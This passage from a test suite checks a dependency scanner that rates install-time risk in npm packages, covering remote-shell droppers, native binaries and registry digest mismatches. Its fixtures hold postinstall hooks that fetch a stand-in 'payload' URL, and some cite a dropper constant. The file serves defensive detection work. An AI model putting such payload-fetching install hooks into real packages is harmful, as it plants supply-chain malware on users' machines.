    expect(assessment.installReachableCapabilities).toContain("code.remote-shell");
  });

  test("a dormant gyp command does not imply automatic install execution", () => {
    const manifest = { name: "n", version: "1.0.0", scripts: {}, gypfile: false };
    const assessment = assessDependencyArtifact(
      [
        file("package.json", JSON.stringify(manifest)),
        file("binding.gyp", '{"variables":{"generated":"<!(node tools/generate.js)"}}'),
        file("tools/generate.js", DROPPER),
      ],
      manifest,
      { codePatternSet: "javascript", entrypointResolution: "npm" },
    );

    expect(assessment.automaticExecution).toEqual([]);
    expect(assessment.observation).toEqual({
      execution: "not-observed",
      risk: "not-observed",
    });
  });

  test("a danger capability the install hook cannot reach remains unknown", () => {
    const assessment = assessDependencyArtifact(
      [
        file(
          "package.json",
          JSON.stringify({ name: "n", version: "1.0.0", scripts: { postinstall: "node ok.js" } }),
        ),
        file("ok.js", "console.log('linked');"),
        file("lib/elsewhere.js", DROPPER),
      ],
      { name: "n", version: "1.0.0", scripts: { postinstall: "node ok.js" } },
      { codePatternSet: "javascript", entrypointResolution: "npm" },
    );
    expect(assessment.observation).toEqual({ execution: "observed", risk: "unknown" });
  });

  test("an install-reachable native artifact does not need an unrelated process launch", () => {
    const manifest = {
      name: "n",
      version: "1.0.0",
      scripts: { postinstall: "node install.js" },
    };
    const assessment = assessDependencyArtifact(
      [
        file("package.json", JSON.stringify(manifest)),
        file("install.js", "require('./bin/addon.node');"),
        { ...file("bin/addon.node", ""), flags: ["binary"] },
        file("lib/build.js", "require('child_process').execFileSync('compiler');"),
      ],
      manifest,
      { codePatternSet: "javascript", entrypointResolution: "npm" },
    );

    expect(assessment.installReachableCapabilities).toContain("file.native-artifact");
    expect(assessment.installReachableCapabilities).not.toContain("code.process-execution");
    expect(assessment.observation).toEqual({ execution: "observed", risk: "observed" });
  });

  test("a lifecycle hook that directly invokes a native executable is observed risk", () => {
    const manifest = {
      name: "n",
      version: "1.0.0",
      scripts: { postinstall: "./bin/installer" },
    };
    const assessment = assessDependencyArtifact(
      [
        file("package.json", JSON.stringify(manifest)),
        {
          path: "bin/installer",
          size: 4096,
          sha256: "native-installer",
          flags: ["binary", "native-elf"],
        },
      ],
      manifest,
      { codePatternSet: "javascript", entrypointResolution: "npm" },
    );

    expect(assessment.installReachableCapabilities).toContain("file.native-artifact");
    expect(assessment.installReachableCapabilities).not.toContain("code.process-execution");
    expect(assessment.observation).toEqual({ execution: "observed", risk: "observed" });
  });

  test("a computed install target keeps a bundled native artifact at unknown high risk", () => {
    const manifest = {
      name: "n",
      version: "1.0.0",
      scripts: { postinstall: "node install.js" },
    };
    const assessment = assessDependencyArtifact(
      [
        file("package.json", JSON.stringify(manifest)),
        file(
          "install.js",
          'const { spawn } = require("node:child_process"); spawn(process.argv[2]);',
        ),
        { ...file("bin/installer.node", ""), flags: ["binary"] },
      ],
      manifest,
      { codePatternSet: "javascript", entrypointResolution: "npm" },
    );

    expect(assessment.observation).toEqual({
      execution: "observed",
      risk: "unknown",
      dynamicInstallTarget: true,
    });
    expect(classifyDependencyInstallRisk(assessment)).toMatchObject({
      severity: "high",
      certainty: "unknown",
      nativeExecution: true,
    });
  });

  test("a capability in a non-install package script is not proven install-reachable", () => {
    const manifest = {
      name: "n",
      version: "1.0.0",
      scripts: {
        postinstall: "node ok.js",
        test: `node -e "fetch('https://tests.example.invalid/fixture')"`,
      },
    };
    const assessment = assessDependencyArtifact(
      [file("package.json", JSON.stringify(manifest)), file("ok.js", "console.log('linked');")],
      manifest,
      { codePatternSet: "javascript", entrypointResolution: "npm" },
    );

    expect(assessment.observation).toEqual({ execution: "observed", risk: "unknown" });
    expect(assessment.capabilities).toContain("code.network-access");
    expect(assessment.installReachableCapabilities).not.toContain("code.network-access");
  });

  test("a capability directly in an install command remains proven reachable", () => {
    const manifest = {
      name: "n",
      version: "1.0.0",
      scripts: { postinstall: `node -e "fetch('https://cdn.example.invalid/payload')"` },
    };
    const assessment = assessDependencyArtifact(
      [file("package.json", JSON.stringify(manifest))],
      manifest,
      { codePatternSet: "javascript", entrypointResolution: "npm" },
    );

    expect(assessment.observation).toEqual({ execution: "observed", risk: "observed" });
    expect(assessment.installReachableCapabilities).toContain("code.network-access");
  });

  test("a lifecycle hook delegated through npm run keeps its downloader reachable", () => {
    const manifest = {
      name: "n",
      version: "1.0.0",
      scripts: { postinstall: "npm run setup", setup: "node downloader.js" },
    };
    const assessment = assessDependencyArtifact(
      [
        file("package.json", JSON.stringify(manifest)),
        file("downloader.js", "fetch('https://cdn.example.invalid/payload');"),
      ],
      manifest,
      { codePatternSet: "javascript", entrypointResolution: "npm" },
    );

    expect(assessment.observation).toEqual({ execution: "observed", risk: "observed" });
    expect(assessment.installReachableCapabilities).toContain("code.network-access");
  });

  test.each(["npm --silent run setup", "npm run --silent setup"])(
    "npm flags cannot hide a delegated install downloader: %s",
    (postinstall) => {
      const manifest = {
        name: "n",
        version: "1.0.0",
        scripts: { postinstall, setup: "node downloader.js" },
      };
      const assessment = assessDependencyArtifact(
        [
          file("package.json", JSON.stringify(manifest)),
          file("downloader.js", "fetch('https://cdn.example.invalid/payload');"),
        ],
        manifest,
        { codePatternSet: "javascript", entrypointResolution: "npm" },
      );

      expect(assessment.observation).toEqual({ execution: "observed", risk: "observed" });
      expect(assessment.installReachableCapabilities).toContain("code.network-access");
    },
  );
});

describe("classifyDependencyInstallRisk", () => {
  test.each([
    ["proven strong behavior", ["code.remote-shell"], ["code.remote-shell"], "critical"],
    ["proven network behavior", ["code.network-access"], ["code.network-access"], "high"],
    ["unproven strong behavior", ["code.remote-shell"], [], "high"],
    ["unproven network behavior", ["code.network-access"], [], "medium"],
  ])("classifies %s as %s", (label, capabilities, installReachableCapabilities, severity) => {
    expect(
      classifyDependencyInstallRisk({
        observation: {
          execution: "observed",
          risk: label.startsWith("proven") ? "observed" : "unknown",
        },
        capabilities,
        installReachableCapabilities,
      }),
    ).toMatchObject({ severity });
  });

  test("classifies a reachable native executable and process launch as proven high risk", () => {
    expect(
      classifyDependencyInstallRisk({
        observation: { execution: "observed", risk: "observed" },
        capabilities: ["code.process-execution", "file.native-artifact"],
        installReachableCapabilities: ["code.process-execution", "file.native-artifact"],
      }),
    ).toMatchObject({ severity: "high", certainty: "observed", nativeExecution: true });
  });

  test("classifies a computed install target with a bundled native artifact as unknown high risk", () => {
    expect(
      classifyDependencyInstallRisk({
        observation: { execution: "observed", risk: "unknown", dynamicInstallTarget: true },
        capabilities: ["file.native-artifact"],
        installReachableCapabilities: [],
      }),
    ).toMatchObject({ severity: "high", certainty: "unknown", nativeExecution: true });
  });

  test("returns null when risk was not observed", () => {
    expect(
      classifyDependencyInstallRisk({
        observation: { execution: "not-observed", risk: "not-observed" },
        capabilities: ["code.remote-shell"],
        installReachableCapabilities: ["code.remote-shell"],
      }),
    ).toBeNull();
  });
});

describe("reconcileDependencyReviewFindings", () => {
  test("keeps declaration findings alongside separately fetched artifact evidence", () => {
    const findings = [
      { ruleId: "dependency.added", evidence: "clean-dep: 1.0.0" },
      { ruleId: "dependency.optional-added", evidence: "optional-dep: ^2.0.0" },
      { ruleId: "dependency.major-bump", evidence: "clean-dep: 0.9.0 → 1.0.0" },
      { ruleId: "dependency.added", evidence: "omitted-dep: 3.0.0" },
    ];
    const review = {
      dependencies: [
        { name: "clean-dep", declaredSpec: "1.0.0" },
        { name: "optional-dep", declaredSpec: "^2.0.0" },
      ],
    };

    expect(reconcileDependencyReviewFindings(findings, review)).toEqual(findings);
  });
});

describe("dependencyEvidenceFindings", () => {
  const parent = { name: "left-pad", version: "1.4.0" };

  function evidence(overrides) {
    return {
      name: "proc-macro1",
      section: "dependencies",
      declaredSpec: "0.1.0",
      declarationKind: "exact",
      status: "inspected",
      reason: null,
      resolvedVersion: "0.1.0",
      registryHost: "registry.npmjs.org",
      artifactOrigin: "https://registry.npmjs.org",
      declaredDigest: null,
      reviewedDigest: null,
      digestVerified: null,
      fileCount: 3,
      automaticExecution: [],
      capabilities: [],
      installReachableCapabilities: [],
      observation: { execution: "not-observed", risk: "not-observed" },
      ...overrides,
    };
  }

  function review(dependencies) {
    return {
      status: "complete",
      selectedCount: dependencies.length,
      inspectedCount: dependencies.filter((d) => d.status === "inspected").length,
      uninspectableCount: dependencies.filter((d) => d.status !== "inspected").length,
      dependencies,
    };
  }

  test("a proven install-time dropper is critical and names the whole path", () => {
    const [finding] = dependencyEvidenceFindings(
      review([
        evidence({
          observation: { execution: "observed", risk: "observed" },
          automaticExecution: [{ kind: "script", name: "postinstall" }],
          capabilities: ["code.remote-shell"],
          installReachableCapabilities: ["code.remote-shell"],
        }),
      ]),
      parent,
    );
    expect(finding.severity).toBe("critical");
    expect(finding.ruleId).toBe("dependency.install-time-capability");
    expect(finding.evidence).toContain("left-pad@1.4.0 → proc-macro1@0.1.0");
    expect(finding.evidence).toContain("package.json#scripts.postinstall");
    expect(finding.ruleVersion).toBe(DETERMINISTIC_RULES_VERSION);
    expect(computeRisk([finding])).toBe("critical");
  });

  test("a registry digest mismatch is a critical review-integrity finding", () => {
    const findings = dependencyEvidenceFindings(
      review([
        evidence({
          declaredDigest: { algorithm: "sha512", value: "aa".repeat(64) },
          reviewedDigest: { algorithm: "sha512", value: "bb".repeat(64) },
          digestVerified: false,
        }),
      ]),
      parent,
    );
    expect(findings).toHaveLength(1);
    expect(findings[0]).toMatchObject({
      severity: "critical",
      ruleId: "dependency.artifact-unavailable",
    });
    expect(computeRisk(findings)).toBe("critical");
  });

  test("a truncated artifact cannot hide its registry digest mismatch", () => {
    const findings = dependencyEvidenceFindings(
      review([
        evidence({
          status: "uninspectable",
          reason: "artifact-truncated",
          declaredDigest: { algorithm: "sha512", value: "aa".repeat(64) },
          reviewedDigest: { algorithm: "sha512", value: "bb".repeat(64) },
          digestVerified: false,
        }),
      ]),
      parent,
    );
    expect(findings.map((finding) => finding.ruleId)).toEqual([
      "dependency.artifact-unavailable",
      "dependency.artifact-unavailable",
    ]);
    expect(computeRisk(findings)).toBe("critical");
  });

  test("an install-time download is a tier below a remote-shell dropper", () => {
    // `critical` has to keep meaning "no benign reading". prebuild-install
    // fetching a platform binary and a dropper fetching a payload look
    // identical to a scanner, so both block approval — at different tiers.
    const [finding] = dependencyEvidenceFindings(
      review([
        evidence({
          observation: { execution: "observed", risk: "observed" },
          automaticExecution: [{ kind: "script", name: "install" }],
          capabilities: ["code.network-access", "code.process-execution"],
          installReachableCapabilities: ["code.network-access"],
        }),
      ]),
      parent,
    );
    expect(finding.severity).toBe("high");
    expect(finding.reason).toContain("prebuilt-binary tooling");
  });

  test("a proven native process launch uses native-specific reviewer copy", () => {
    const [finding] = dependencyEvidenceFindings(
      review([
        evidence({
          observation: { execution: "observed", risk: "observed" },
          automaticExecution: [{ kind: "script", name: "postinstall" }],
          capabilities: ["code.process-execution", "file.native-artifact"],
          installReachableCapabilities: ["code.process-execution", "file.native-artifact"],
        }),
      ]),
      parent,
    );
    expect(finding.severity).toBe("high");
    expect(finding.reason).toContain("native executable");
    expect(finding.reason).not.toContain("network");
  });

  test("an unproven install-time reach lands one step lower", () => {
    const [finding] = dependencyEvidenceFindings(
      review([
        evidence({
          observation: { execution: "observed", risk: "unknown" },
          automaticExecution: [{ kind: "script", name: "postinstall" }],
          capabilities: ["code.remote-shell"],
          installReachableCapabilities: [],
        }),
      ]),
      parent,
    );
    expect(finding.severity).toBe("high");
  });

  test("an unproven network capability does not claim every install fetches", () => {
    const [finding] = dependencyEvidenceFindings(
      review([
        evidence({
          observation: { execution: "observed", risk: "unknown" },
          automaticExecution: [{ kind: "script", name: "postinstall" }],
          capabilities: ["code.network-access"],
          installReachableCapabilities: [],
        }),
      ]),
      parent,
    );
    expect(finding.severity).toBe("medium");
    expect(finding.reason).toContain("could not statically prove");
    expect(finding.reason).not.toContain("every consumer install makes that request");
  });

  test("a benign new dependency stays low risk", () => {
    const findings = dependencyEvidenceFindings(
      review([evidence({ capabilities: ["code.network-access"] })]),
      parent,
    );
    expect(findings).toHaveLength(1);
    expect(findings[0].severity).toBe("info");
    expect(computeRisk(findings)).toBe("low");
  });

  test("a bare wildcard is a range, not a dist-tag", () => {
    const selected = selectAddedDependencies(
      diffOf({ name: "p" }, { name: "p", dependencies: { any: "x", star: "*" } }),
    );
    expect(selected.map((entry) => entry.declarationKind)).toEqual(["range", "range"]);
  });

  test("a dependency whose only finding has no reviewer-facing label raises nothing", () => {
    // An `info` signal reading "no capability rules matched" is noise dressed
    // as evidence.
    expect(
      dependencyEvidenceFindings(
        review([evidence({ capabilities: ["package-json.entrypoint-missing"] })]),
        parent,
      ),
    ).toEqual([]);
  });

  test("a dependency with no capabilities at all raises nothing", () => {
    expect(dependencyEvidenceFindings(review([evidence({})]), parent)).toEqual([]);
  });

  test("an uninspectable dependency floors the release at manual review", () => {
    const [finding] = dependencyEvidenceFindings(
      review([
        evidence({
          status: "uninspectable",
          reason: "metadata-unavailable",
          resolvedVersion: null,
        }),
      ]),
      parent,
    );
    expect(finding.severity).toBe("medium");
    expect(finding.ruleId).toBe("dependency.artifact-unavailable");
    expect(finding.evidence).toContain("credential-free");
    expect(computeRisk([finding])).toBe("medium");
  });

  test("an uninspectable dependency keeps install risk proven by retained bytes", () => {
    const findings = dependencyEvidenceFindings(
      review([
        evidence({
          status: "uninspectable",
          reason: "artifact-truncated",
          automaticExecution: [{ kind: "script", name: "postinstall" }],
          capabilities: ["code.remote-shell", "code.process-execution"],
          installReachableCapabilities: ["code.remote-shell", "code.process-execution"],
          observation: { execution: "observed", risk: "observed" },
        }),
      ]),
      parent,
    );

    expect(findings.map((finding) => [finding.ruleId, finding.severity])).toEqual([
      ["dependency.install-time-capability", "critical"],
      ["dependency.artifact-unavailable", "medium"],
    ]);
    expect(computeRisk(findings)).toBe("critical");
  });

  test("budget-skipped dependencies aggregate into one finding", () => {
    const findings = dependencyEvidenceFindings(
      review([
        evidence({ name: "a", status: "uninspectable", reason: "budget-exhausted" }),
        evidence({ name: "b", status: "uninspectable", reason: "budget-exhausted" }),
        evidence({ name: "c", status: "uninspectable", reason: "budget-exhausted" }),
      ]),
      parent,
    );
    expect(findings).toHaveLength(1);
    expect(findings[0].evidence).toContain("3 newly added dependencies were not reviewed");
  });

  test("review-wide failures aggregate and include omitted dependency counts", () => {
    const findings = dependencyEvidenceFindings(
      {
        ...review([
          evidence({ name: "a", status: "uninspectable", reason: "review-failed" }),
          evidence({ name: "b", status: "uninspectable", reason: "review-failed" }),
        ]),
        status: "partial",
        selectedCount: 70,
        uninspectableCount: 70,
        omittedCount: 68,
      },
      parent,
    );
    expect(findings).toHaveLength(1);
    expect(findings[0].evidence).toContain("70 newly added dependencies were not reviewed");
    expect(findings[0].evidence).toContain("68 more omitted");
  });

  test("omitted-only dependency records still produce one aggregate gap", () => {
    const findings = dependencyEvidenceFindings(
      {
        status: "partial",
        selectedCount: 70,
        inspectedCount: 64,
        uninspectableCount: 6,
        omittedCount: 6,
        dependencies: [],
      },
      parent,
    );
    expect(findings).toHaveLength(1);
    expect(findings[0]).toMatchObject({
      ruleId: "dependency.artifact-unavailable",
      severity: "medium",
    });
    expect(findings[0].evidence).toContain("6 newly added dependencies were not reviewed");
  });

  test("a release with no added dependency produces nothing", () => {
    expect(
      dependencyEvidenceFindings(
        {
          status: "not-applicable",
          selectedCount: 0,
          inspectedCount: 0,
          uninspectableCount: 0,
          omittedCount: 0,
          dependencies: [],
        },
        parent,
      ),
    ).toEqual([]);
  });
});

describe("normalizeDependencyReview", () => {
  test("rejects blobs that are not a dependency review", () => {
    expect(normalizeDependencyReview(null)).toBeNull();
    expect(normalizeDependencyReview({})).toBeNull();
    expect(normalizeDependencyReview({ status: "bogus", dependencies: [] })).toBeNull();
  });

  test("rejects a complete blob containing a malformed entry", () => {
    const review = normalizeDependencyReview({
      status: "complete",
      selectedCount: 2,
      inspectedCount: 1,
      uninspectableCount: 1,
      dependencies: [
        { name: "ok", declaredSpec: "^1.0.0", status: "inspected", verdict: "install-risk" },
        { declaredSpec: "^1.0.0" },
      ],
    });
    expect(review).toBeNull();
  });

  test("derives an applicable status from retained dependency rows", () => {
    const review = normalizeDependencyReview({
      status: "not-applicable",
      selectedCount: 1,
      inspectedCount: 1,
      uninspectableCount: 0,
      dependencies: [{ name: "x", declaredSpec: "1.0.0", status: "inspected", verdict: "clean" }],
    });

    expect(review).toMatchObject({
      status: "complete",
      selectedCount: 1,
      inspectedCount: 1,
      uninspectableCount: 0,
    });
  });

  test("rejects counts that claim omitted evidence was retained", () => {
    expect(
      normalizeDependencyReview({
        status: "complete",
        selectedCount: 1,
        inspectedCount: 1,
        uninspectableCount: 0,
        dependencies: [],
      }),
    ).toBeNull();
  });

  test("rejects an applicable status with no retained or omitted evidence", () => {
    expect(normalizeDependencyReview({ status: "partial", dependencies: [] })).toBeNull();
  });

  test("an unrecognized uninspectable reason normalizes to null, never a pass", () => {
    const review = normalizeDependencyReview({
      status: "partial",
      dependencies: [
        { name: "x", declaredSpec: "1.0.0", status: "uninspectable", reason: "made-up" },
      ],
    });
    expect(review.dependencies[0].status).toBe("uninspectable");
    expect(review.dependencies[0].reason).toBeNull();
  });

  test("preserves valid retained-byte observations on an uninspectable row", () => {
    const review = normalizeDependencyReview({
      status: "partial",
      dependencies: [
        {
          name: "x",
          declaredSpec: "1.0.0",
          status: "uninspectable",
          reason: "artifact-truncated",
          observation: { execution: "observed", risk: "observed" },
        },
      ],
    });
    expect(review.dependencies[0].observation).toEqual({ execution: "observed", risk: "observed" });
  });

  test.each([undefined, "bogus"])(
    "rejects inspected evidence without an explicit valid verdict (%s)",
    (verdict) => {
      const review = normalizeDependencyReview({
        status: "complete",
        dependencies: [{ name: "x", declaredSpec: "1.0.0", status: "inspected", verdict }],
      });
      expect(review).toBeNull();
    },
  );

  test("retains only the origin from persisted artifact URLs", () => {
    const review = normalizeDependencyReview({
      status: "complete",
      dependencies: [
        {
          name: "x",
          declaredSpec: "1.0.0",
          status: "inspected",
          verdict: "clean",
          artifactUrl:
            "https://reader:secret@registry.example.com/private/signed-path-token/x/-/x-1.0.0.tgz?token=signed#fragment",
        },
      ],
    });
    expect(review.dependencies[0].artifactOrigin).toBe("https://registry.example.com");
  });

  test("bounds persisted evidence and accounts for omitted records", () => {
    const review = normalizeDependencyReview({
      status: "complete",
      selectedCount: 80,
      inspectedCount: 80,
      uninspectableCount: 0,
      dependencies: Array.from({ length: 80 }, (_, index) => ({
        name: `dependency-${index}-${"x".repeat(300)}`,
        declaredSpec: "1.0.0",
        status: "inspected",
        verdict: "clean",
      })),
    });

    expect(review.status).toBe("partial");
    expect(review.dependencies).toHaveLength(64);
    expect(review.omittedCount).toBe(16);
    expect(review.dependencies[0].name.length).toBe(256);
  });
});
